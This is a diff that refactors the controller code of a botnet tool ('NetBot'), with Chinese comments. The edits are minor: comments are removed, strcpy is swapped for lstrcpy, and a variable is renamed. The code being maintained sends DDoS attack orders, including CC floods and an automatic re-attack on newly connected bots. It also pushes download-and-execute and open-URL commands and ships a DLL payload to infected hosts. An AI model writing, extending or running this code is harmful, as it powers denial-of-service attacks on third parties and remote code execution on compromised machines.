@@ -493,27 +493,23 @@ void CNetBotDlg::OnBtnTupdate()
 
 void CNetBotDlg::OnBtnTserver()
 {
-	//配服务端
 	CServerDlg m_ServerDlg;
 	m_ServerDlg.DoModal();
 }
 
 void CNetBotDlg::OnBtnThelp()
 {
-	//帮助
 	ShellExecute(0, "open", "help.chm", NULL, NULL, 5);
 }
 
 void CNetBotDlg::OnBtnTexit()
 {
-	//退出系统
 	OnCancel();
 }
 
 void CNetBotDlg::OnBtnTwebsite()
 {
 	//官方网站
-
 }
 
 void CNetBotDlg::OnSelectComputer(UINT nID)
@@ -524,7 +520,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 	int i = 0;
 	switch (nID)
 	{
-	case IDC_RADIO1://WinXP
+	case IDC_RADIO1: //WinXP
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip;
@@ -537,7 +533,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 				m_OnLineList.SetCheck(i, FALSE);
 		}
 		break;
-	case IDC_RADIO2://Win2000&2003
+	case IDC_RADIO2: //Win2000&2003
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip;
@@ -574,7 +570,6 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 
 void CNetBotDlg::OnBtnSelNum()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData(TRUE);
 
 	CAutoLock Lock(cOnlineLock);
@@ -592,7 +587,8 @@ void CNetBotDlg::OnBtnSelNum()
 				iSendNum++;
 			}
 			else
-			{//到数量了
+			{
+				//到数量了
 				break;
 			}
 		}
@@ -603,9 +599,8 @@ void CNetBotDlg::OnBtnSelNum()
 void CNetBotDlg::StartListen(int Port)
 {
 	m_ListenPort = Port;
-	//启动监听线程
+
 	hAcceptThread = ThreadTemplate::StartThread<CNetBotDlg, DWORD>(this, &CNetBotDlg::ThreadAccept);
-	//启动在线检测线程
 	hCheckThread = ThreadTemplate::StartThread<CNetBotDlg, DWORD>(this, &CNetBotDlg::ThreadCheck);
 
 	if (hAcceptThread == NULL || hCheckThread == NULL)
@@ -745,7 +740,6 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 				break;
 			}
 
-			MsgHead msgHead;
 			msgHead.dwCmd = CMD_DLLDATA;
 			msgHead.dwSize = SvcFileSize;
 
@@ -803,15 +797,15 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 			{
 				DdosAttack m_Attack;
 				memset(&m_Attack, 0, sizeof(DdosAttack));
-				strcpy(m_Attack.szTarget, m_AutoAttack.szAttackIP);
+				lstrcpy(m_Attack.szTarget, m_AutoAttack.szAttackIP);
 				m_Attack.iPort = m_AutoAttack.iAttackPort;
 				m_Attack.iThread = m_AutoAttack.iAttackThread;
 
-				MsgHead msgHead;
-				msgHead.dwCmd = m_AutoAttack.dwAttackType;
-				msgHead.dwSize = sizeof(DdosAttack);
+				MsgHead msgHeadRep;
+				msgHeadRep.dwCmd = m_AutoAttack.dwAttackType;
+				msgHeadRep.dwSize = sizeof(DdosAttack);
 
-				SendMsg(socket, (char*)&m_Attack, &msgHead);
+				SendMsg(socket, (char*)&m_Attack, &msgHeadRep);
 				m_OnLineList.SetItemText(iCount, 6, "任务0");
 			}
 		}
@@ -1334,7 +1328,7 @@ void CNetBotDlg::OnBtnMulexec()
 
 	msgHead.dwCmd = CMD_DOWNEXEC;
 	msgHead.dwSize = m_ExecUrl.GetLength();
-	strcpy(chBuffer, m_ExecUrl);
+	lstrcpy(chBuffer, m_ExecUrl);
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1371,7 +1365,7 @@ void CNetBotDlg::OnBtnMulopen()
 
 	msgHead.dwCmd = CMD_OPENURL;
 	msgHead.dwSize = m_OpenUrl.GetLength();
-	strcpy(chBuffer, m_OpenUrl);
+	lstrcpy(chBuffer, m_OpenUrl);
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1403,7 +1397,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
 {
 	DdosAttack m_Attack;
 	memset(&m_Attack, 0, sizeof(DdosAttack));
-	strcpy(m_Attack.szTarget, ip);
+	lstrcpy(m_Attack.szTarget, ip);
 	m_Attack.iPort = port;
 	m_Attack.iThread = thread;
 
@@ -1476,7 +1470,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
 		{
 			m_AutoAttack.bAutoAttack = TRUE;
 			m_AutoAttack.dwAttackType = msgHead.dwCmd;
-			strcpy(m_AutoAttack.szAttackIP, m_Attack.szTarget);
+			lstrcpy(m_AutoAttack.szAttackIP, m_Attack.szTarget);
 			m_AutoAttack.iAttackPort = m_Attack.iPort;
 			m_AutoAttack.iAttackThread = m_Attack.iThread;
 		}
@@ -1540,7 +1534,7 @@ int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int n
 {
 	DdosAttack m_Attack;
 	memset(&m_Attack, 0, sizeof(DdosAttack));
-	strcpy(m_Attack.szTarget, ip);
+	lstrcpy(m_Attack.szTarget, ip);
 	m_Attack.iPort = port;
 	m_Attack.iThread = thread;
 	m_Attack.iExtend1 = iBegin;
